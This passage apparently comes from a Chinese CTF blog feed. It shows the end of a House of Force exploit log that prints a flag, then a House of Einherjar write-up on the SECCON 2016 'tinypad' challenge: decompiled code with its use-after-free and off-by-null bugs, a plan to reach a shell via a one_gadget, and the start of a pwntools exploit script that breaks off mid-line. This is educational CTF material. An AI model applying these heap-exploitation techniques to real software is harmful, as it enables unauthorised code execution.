class="hljs-number">0xffffffffffffffa1</span> #top_chunk<br><span class="hljs-number">0xe80070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0xe800e0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h3 id="debug-exp"><a href="#debug-exp" class="headerlink" title="debug-exp"></a>debug-exp</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c">➜  ~ cd Desktop/<br>    <span class="hljs-string">'5.exit\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Your choice:'</span><br>[DEBUG] Sent <span class="hljs-number">0x5</span> bytes:<br>    <span class="hljs-string">'bbbb\n'</span><br>[DEBUG] Sent <span class="hljs-number">0x2</span> bytes:<br>    <span class="hljs-string">'2\n'</span><br>[DEBUG] Received <span class="hljs-number">0x117</span> bytes:<br>    <span class="hljs-string">'invaild choice!!!\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Bamboobox Menu\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'1.show the items in the box\n'</span><br>    <span class="hljs-string">'2.add a new item\n'</span><br>    <span class="hljs-string">'3.change the item in the box\n'</span><br>    <span class="hljs-string">'4.remove the item in the box\n'</span><br>    <span class="hljs-string">'5.exit\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Your choice:Please enter the length of item name:'</span><br>[DEBUG] Sent <span class="hljs-number">0x3</span> bytes:<br>    <span class="hljs-string">'16\n'</span><br>[DEBUG] Received <span class="hljs-number">0x1e</span> bytes:<br>    <span class="hljs-string">'Please enter the name of item:'</span><br>[DEBUG] Sent <span class="hljs-number">0x11</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">49</span> <span class="hljs-number">0</span>d <span class="hljs-number">40</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">49</span> <span class="hljs-number">0</span>d <span class="hljs-number">40</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │I·@·│····│I·@·│····│<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">0</span>a                                                  │·│<br>    <span class="hljs-number">00000011</span><br>[DEBUG] Received <span class="hljs-number">0x1d2</span> bytes:<br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Bamboobox Menu\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'1.show the items in the box\n'</span><br>    <span class="hljs-string">'2.add a new item\n'</span><br>    <span class="hljs-string">'3.change the item in the box\n'</span><br>    <span class="hljs-string">'4.remove the item in the box\n'</span><br>    <span class="hljs-string">'5.exit\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Your choice:invaild choice!!!\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Bamboobox Menu\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'1.show the items in the box\n'</span><br>    <span class="hljs-string">'2.add a new item\n'</span><br>    <span class="hljs-string">'3.change the item in the box\n'</span><br>    <span class="hljs-string">'4.remove the item in the box\n'</span><br>    <span class="hljs-string">'5.exit\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Your choice:'</span><br>[DEBUG] Sent <span class="hljs-number">0x2</span> bytes:<br>    <span class="hljs-string">'5\n'</span><br>[*] Switching to interactive mode<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br><span class="hljs-number">1.</span>show the items in the box<br><span class="hljs-number">2.</span>add a new item<br><span class="hljs-number">3.</span>change the item in the box<br><span class="hljs-number">4.</span>remove the item in the box<br><span class="hljs-number">5.</span><span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:invaild choice!!!<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br><span class="hljs-number">1.</span>show the items in the box<br><span class="hljs-number">2.</span>add a new item<br><span class="hljs-number">3.</span>change the item in the box<br><span class="hljs-number">4.</span>remove the item in the box<br><span class="hljs-number">5.</span><span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:[*] Process <span class="hljs-string">'./bamboobox'</span> stopped with <span class="hljs-built_in">exit</span> code <span class="hljs-number">0</span> (pid <span class="hljs-number">29277</span>)<br>[DEBUG] Received <span class="hljs-number">0x15</span> bytes:<br>    <span class="hljs-string">'flag{house_of_force}\n'</span><br>flag{house_of_force}<br>[*] Got EOF <span class="hljs-keyword">while</span> reading in interactive<br>$  <br></code></pre></td></tr></tbody></table></figure><p>可以看到已经打印出来了 flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;House Of Force（控制top_chunk）（基础）&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;参考资料：&lt;br&gt;
CTF-wiki：&lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-hea</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Einherjar</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Einherjar/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Einherjar/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:19.992Z</updated>
    
    <content type="html"><![CDATA[<h1>House of Einherjar</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>释放堆块时，unlink后向合并堆块，强制使得 malloc 返回一个几乎任意地址的 chunk 。</p><p>free 函数中的后向合并核心操作如下</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">prev_inuse</span>(p)) {<br>    prevsize = <span class="hljs-built_in">prev_size</span>(p);<br>    size += prevsize;<br>    p = <span class="hljs-built_in">chunk_at_offset</span>(p, -((<span class="hljs-type">long</span>) prevsize));<br>    <span class="hljs-built_in">unlink</span>(av, p, bck, fwd);<br>}<br></code></pre></td></tr></tbody></table></figure><blockquote><p>后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize))<br class='item-img' data-src='https://img-blog.csdnimg.cn/9b846f8b786542daa1c92131e0870ab3.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/9b846f8b786542daa1c92131e0870ab3.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p></blockquote><h2 id="思路1：两个chunk通过后向unlink直接实现任意地址写"><a href="#思路1：两个chunk通过后向unlink直接实现任意地址写" class="headerlink" title="思路1：两个chunk通过后向unlink直接实现任意地址写"></a>思路1：两个chunk通过后向unlink直接实现任意地址写</h2><p>假设有两个连续的chunk，我们利用低地址的chunk将高地址 chunk 的 prev_size 写为目标地址与当前地址的差值，free后合并，再malloc，就可以申请到目标地址的chunk，实现任意地址写，但是需要在目的 chunk 附近构造相应的 fake chunk，fake_chunk的size字段，必须和chunk_b的pre_size字段一致，为二者之间的偏移量，从而绕过 unlink 的检测。</p><h2 id="思路2：三个chunk通过后向unlink实现double-free"><a href="#思路2：三个chunk通过后向unlink实现double-free" class="headerlink" title="思路2：三个chunk通过后向unlink实现double-free"></a>思路2：三个chunk通过后向unlink实现double free</h2><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chunk_0</span>  <span class="hljs-number">0</span>xD0    # 堆块大小需要保证释放后不进入tcache bin和fastbin，即存在tcache需要先填满对应的tcache <br><span class="hljs-attribute">chunk_1</span>  <span class="hljs-number">0</span>x18    # 堆块大小以<span class="hljs-number">8</span>结尾，保证<span class="hljs-literal">off</span> by null可以覆盖到下一个堆块的prev_inuse<br><span class="hljs-attribute">chunk_2</span>  <span class="hljs-number">0</span>xD0    # 堆块大小的最后一个字节必须为<span class="hljs-number">00</span>，也就是上一个堆块覆盖prev_inuse后不会影响该堆块的大小<br><span class="hljs-attribute">chunk_3</span>  <span class="hljs-number">0</span>x10    # 堆块大小任意，防止前面的堆块合并到Top chunk中<br></code></pre></td></tr></tbody></table></figure><p>申请四个chunk，第四个chunk用来将前三个chunk与top chunk隔开（防止free前三个chunk后与top chunk合并），先free(chunk_0)，利用off-by-null修改第2个chunk的mem，将第三个chunk的的prev_size修改为前两个chunk大小之和，然后free(chunk_2)，将chunk_0,chunk_1,chunk_2合并，之后申请chunk_0大小和chunk_1大小的chunk，再free(chunk_1),free(chunk_5)，实际chunk_1和chunk_5是同一个chunk，从而实现double free。</p><h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h3 id="2016-seccon-tinypad"><a href="#2016-seccon-tinypad" class="headerlink" title="2016-seccon-tinypad"></a>2016_seccon_tinypad</h3><p class='item-img' data-src='https://img-blog.csdnimg.cn/803d17adef39414caf3dbcc00a7a677a.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/803d17adef39414caf3dbcc00a7a677a.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/2c675a4984ad4676818af16848b058bf.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/2c675a4984ad4676818af16848b058bf.png?ynotemdtimestamp=1663776476851" alt="img"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/32b875e635b2480e8d54952a02777e2f.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/32b875e635b2480e8d54952a02777e2f.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>运行程序发现有四个功能：增删改退，分别用a,d,e,q进行操作，并且每次进行一次操作，程序会把每个chunk的内容输出出来，根据ida伪代码发现只能最多申请4个chunk<br class='item-img' data-src='https://img-blog.csdnimg.cn/845fc9c4bc3e4c9fb506077a5df0f2f0.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/845fc9c4bc3e4c9fb506077a5df0f2f0.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><h4 id="ida伪代码"><a href="#ida伪代码" class="headerlink" title="ida伪代码"></a>ida伪代码</h4><p>主函数</p><figure class="highlight sas"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs sas">int __cdecl mai<span class="hljs-meta">n</span>(int argc, const char <span class="hljs-comment">**argv, const char **envp)</span><br><span class="hljs-comment">{</span><br><span class="hljs-comment">  __int64 v3;</span> // rax<br>  int choice; // eax<br>  int v5; // eax<br>  __int64 v6; // rax<br>  size_t v7; // rax<br>  int c; // [rsp+4h] [rbp-1Ch] BYREF<br>  int i; // [rsp+8h] [rbp-18h]<br>  int <span class="hljs-keyword">index</span>; // [rsp+Ch] [rbp-14h]<br>  int v12; // [rsp+10h] [rbp-10h]<br>  int v13; // [rsp+14h] [rbp-Ch]<br>  unsigned __int64 v14; // [rsp+18h] [rbp-8h]<br><br>  v14 = __readfsqword(0x28u);<br>  v12 = 0;<br>  write_<span class="hljs-meta">n</span>(<span class="hljs-variable">&amp;unk_4019F0</span>, 1uLL);<br>  write_<span class="hljs-meta">n</span>(<br>    <span class="hljs-string">"  ============================================================================\n"</span><br>    <span class="hljs-string">"// _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\n"</span><br>    <span class="hljs-string">"||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\n"</span><br>    <span class="hljs-string">"||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\n"</span><br>    <span class="hljs-string">"||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\n"</span><br>    <span class="hljs-string">"\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     //\n"</span><br>    <span class="hljs-string">"  ============================================================================\n"</span>,<br>    563uLL);<br>  write_<span class="hljs-meta">n</span>(<span class="hljs-variable">&amp;unk_4019F0</span>, 1uLL);<br>  <span class="hljs-keyword">do</span><br>  {<br>    for ( i = 0; i &lt;= 3; ++i )<br>    {<br>      LO<span class="hljs-meta">BYTE</span>(c) = i + 49;<br>      writel<span class="hljs-meta">n</span>(<span class="hljs-string">"+------------------------------------------------------------------------------+\n"</span>, 81LL);<br>      write_<span class="hljs-meta">n</span>(<span class="hljs-string">" #   INDEX: "</span>, 12uLL);<br>      writel<span class="hljs-meta">n</span>(<span class="hljs-variable">&amp;c</span>, 1LL);<br>      write_<span class="hljs-meta">n</span>(<span class="hljs-string">" # CONTENT: "</span>, 12uLL);<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-comment">*&amp;tinypad[16 * i + 264] )</span><br><span class="hljs-comment">      {</span><br><span class="hljs-comment">        v3 = strlen(*&amp;tinypad[16 * i + 264]);</span><br>        writel<span class="hljs-meta">n</span>(<span class="hljs-comment">*&amp;tinypad[16 * i + 264], v3);</span><br>      }<br>      writel<span class="hljs-meta">n</span>(<span class="hljs-variable">&amp;unk_4019F0</span>, 1LL);<br>    }<br>    <span class="hljs-keyword">index</span> = 0;<br>    choice = getcmd();<br>    v12 = choice;<br>    <span class="hljs-keyword">if</span> ( choice == 68 )<br>    {<br>      write_<span class="hljs-meta">n</span>(<span class="hljs-string">"(INDEX)&gt;&gt;&gt; "</span>, 11uLL);<br>      <span class="hljs-keyword">index</span> = read_<span class="hljs-meta">int</span>();<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">index</span> &lt;= 0 || <span class="hljs-keyword">index</span> &gt; 4 )            // 只能申请四个chunk<br>                                                // <br>      {<br>LABEL_29:<br>        writel<span class="hljs-meta">n</span>(<span class="hljs-string">"Invalid index"</span>, 13LL);<br>        <span class="hljs-keyword">continue</span>;<br>      }<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-comment">*&amp;tinypad[16 * index + 240] )</span><br><span class="hljs-comment">      {</span><br><span class="hljs-comment">LABEL_31:</span><br><span class="hljs-comment">        writeln("Not used", 8LL);</span><br>        <span class="hljs-keyword">continue</span>;<br>      }<br>      free(<span class="hljs-comment">*&amp;tinypad[16 * index + 248]);</span><br>      <span class="hljs-comment">*&amp;tinypad[16 * index + 240] = 0LL;</span>        // size置为0，头指针未置为0<br>      writel<span class="hljs-meta">n</span>(<span class="hljs-string">"\nDeleted."</span>, 9LL);      //uaf<br>    }<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( choice &gt; 0x44 )<br>    {<br>      <span class="hljs-keyword">if</span> ( choice != 0x45 )<br>      {<br>        <span class="hljs-keyword">if</span> ( choice == 81 )<br>          <span class="hljs-keyword">continue</span>;<br>LABEL_41:<br>        writel<span class="hljs-meta">n</span>(<span class="hljs-string">"No such a command"</span>, 17LL);<br>        <span class="hljs-keyword">continue</span>;<br>      }<br>      write_<span class="hljs-meta">n</span>(<span class="hljs-string">"(INDEX)&gt;&gt;&gt; "</span>, 11uLL);<br>      <span class="hljs-keyword">index</span> = read_<span class="hljs-meta">int</span>();<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">index</span> &lt;= 0 || <span class="hljs-keyword">index</span> &gt; 4 )<br>        <span class="hljs-keyword">goto</span> LABEL_29;<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-comment">*&amp;tinypad[16 * index + 240] )</span><br><span class="hljs-comment">        goto LABEL_31;</span><br>      c = 48;<br>      strcpy(tinypad, <span class="hljs-comment">*&amp;tinypad[16 * index + 248]);</span><br>      <span class="hljs-keyword">while</span> ( toupper(c) != 89 )<br>      {<br>        write_<span class="hljs-meta">n</span>(<span class="hljs-string">"CONTENT: "</span>, 9uLL);<br>        v6 = strle<span class="hljs-meta">n</span>(tinypad);<br>        writel<span class="hljs-meta">n</span>(tinypad, v6);<br>        write_<span class="hljs-meta">n</span>(<span class="hljs-string">"(CONTENT)&gt;&gt;&gt; "</span>, 13uLL);<br>        v7 = strle<span class="hljs-meta">n</span>(<span class="hljs-comment">*&amp;tinypad[16 * index + 248]);</span><br>        read_until(tinypad, v7, 10u);<br>        writel<span class="hljs-meta">n</span>(<span class="hljs-string">"Is it OK?"</span>, 9LL);<br>        write_<span class="hljs-meta">n</span>(<span class="hljs-string">"(Y/n)&gt;&gt;&gt; "</span>, 9uLL);<br>        read_until(<span class="hljs-variable">&amp;c</span>, 1uLL, 10u);<br>      }<br>      strcpy(<span class="hljs-comment">*&amp;tinypad[16 * index + 248], tinypad);</span><br>      writel<span class="hljs-meta">n</span>(<span class="hljs-string">"\nEdited."</span>, 8LL);<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( choice != 65 )<br>        <span class="hljs-keyword">goto</span> LABEL_41;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-keyword">index</span> &lt;= 3 <span class="hljs-variable">&amp;&amp;</span> <span class="hljs-comment">*&amp;tinypad[16 * index + 256] )</span><br><span class="hljs-comment">        ++index;</span><br>      <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">index</span> == 4 )<br>      {<br>        writel<span class="hljs-meta">n</span>(<span class="hljs-string">"No space is left."</span>, 17LL);<br>      }<br>      <span class="hljs-keyword">else</span><br>      {<br>        v13 = -1;<br>        write_<span class="hljs-meta">n</span>(<span class="hljs-string">"(SIZE)&gt;&gt;&gt; "</span>, 10uLL);<br>        v13 = read_<span class="hljs-meta">int</span>();<br>        <span class="hljs-keyword">if</span> ( v13 &lt;= 0 )<br>        {<br>          v5 = 1;<br>        }<br>        <span class="hljs-keyword">else</span><br>        {<br>          v5 = v13;<br>          <span class="hljs-keyword">if</span> ( v13 &gt; 0x100 )<br>            v5 = 256;<br>        }<br>        v13 = v5;<br>        <span class="hljs-comment">*&amp;tinypad[16 * index + 256] = v5;</span><br>        <span class="hljs-comment">*&amp;tinypad[16 * index + 264] = malloc(v13);</span><br>        <span class="hljs-keyword">if</span> ( !<span class="hljs-comment">*&amp;tinypad[16 * index + 264] )</span><br><span class="hljs-comment">        {</span><br><span class="hljs-comment">          writerrln("[!] No memory is available.", 27LL);</span><br>          exit(-1);<br>        }<br>        write_<span class="hljs-meta">n</span>(<span class="hljs-string">"(CONTENT)&gt;&gt;&gt; "</span>, 13uLL);<br>        read_until(<span class="hljs-comment">*&amp;tinypad[16 * index + 264], v13, 10u);</span><br>        writel<span class="hljs-meta">n</span>(<span class="hljs-string">"\nAdded."</span>, 7LL);<br>      }<br>    }<br>  }<br>  <span class="hljs-keyword">while</span> ( v12 != 81 );<br>  <span class="hljs-keyword">return</span> 0;<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/36cbf32b34ff4763bc3c8ee7d005d707.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/36cbf32b34ff4763bc3c8ee7d005d707.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/f979860f82c140b0ac13547f4c6ab391.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/f979860f82c140b0ac13547f4c6ab391.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">*<span class="hljs-meta">&amp;tinypad[16 * index + 0x100] = v5;</span><br>   *<span class="hljs-meta">&amp;tinypad[16 * index + 264] = malloc(v13);</span><br></code></pre></td></tr></tbody></table></figure><p>存在chunk全局数组，起始地址从0x602040+16*0+0x100=0x602140 开始依次存放chunk的size大小和头指针</p><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/e19c3dd623844a70a68224c7f7ac2b22.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e19c3dd623844a70a68224c7f7ac2b22.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/5484173e0ffe4c4699251e0073885c26.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/5484173e0ffe4c4699251e0073885c26.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>该edit函数调用的read_until函数存在off-by-null漏洞</p><h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/46d199c2d35b49b3b638f8edd4fdf44d.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/46d199c2d35b49b3b638f8edd4fdf44d.png?ynotemdtimestamp=1663776476851" alt="img"><br>free函数存在uaf漏洞</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先泄露libc和heap地址</p><p>利用 house of einherjar 方法在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。</p><p>这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。不能覆盖malloc_hook</p><figure class="highlight abnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v6</span> <span class="hljs-operator">=</span> strlen(tinypad)<span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><p>可以泄露出environ 的地址，通过gdb调试进而求得存储 main 函数的返回地址的地址，将main 函数的返回地址覆盖为one_gadget来获得shell</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>先把前面的代码写好</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import*<br>context(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>) <span class="hljs-comment">#小端序，linux系统，64位架构,debug</span><br>sh = process(<span class="hljs-string">'./tinypad'</span>)<br>libc = <span class="hljs-variable constant_">ELF</span>(<span class="hljs-string">'//home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so'</span>)<br><br><span class="hljs-comment">#命令简写化</span><br>s       = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:sh</span>.send(data)<br>sa      = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:sh</span>.sendafter(delim, data)<br>sl      = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:sh</span>.sendline(data)<br>sla     = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:sh</span>.sendlineafter(delim, data)<br>r       = <span class="hljs-built_in">lambda</span> num=<span class="hljs-number">4096</span>           <span class="hljs-symbol">:sh</span>.recv(num)<br>ru      = <span class="hljs-built_in">lambda</span> delims             <span 